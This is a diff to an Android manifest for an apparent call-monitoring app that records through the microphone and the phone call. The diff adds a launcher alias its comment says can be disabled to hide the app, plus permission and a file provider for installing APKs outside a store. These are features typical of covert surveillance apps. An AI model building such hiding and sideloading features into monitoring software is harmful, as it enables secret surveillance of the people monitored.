@@ -32,6 +32,9 @@
     <!-- Notifications -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
+    <!-- Install packages (for OTA updates) -->
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+
     <application
         android:name=".CallMonitorApp"
         android:allowBackup="true"
@@ -47,11 +50,19 @@
             android:name=".MainActivity"
             android:exported="true"
             android:theme="@style/Theme.CallMonitor">
+        </activity>
+
+        <!-- Launcher alias - can be disabled to hide app from launcher -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="true"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- Call Receiver -->
         <receiver
@@ -89,6 +100,17 @@
             android:exported="false"
             android:foregroundServiceType="microphone|phoneCall"
             android:stopWithTask="false" />
+
+        <!-- FileProvider for APK installation -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.provider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
 
     </application>
 
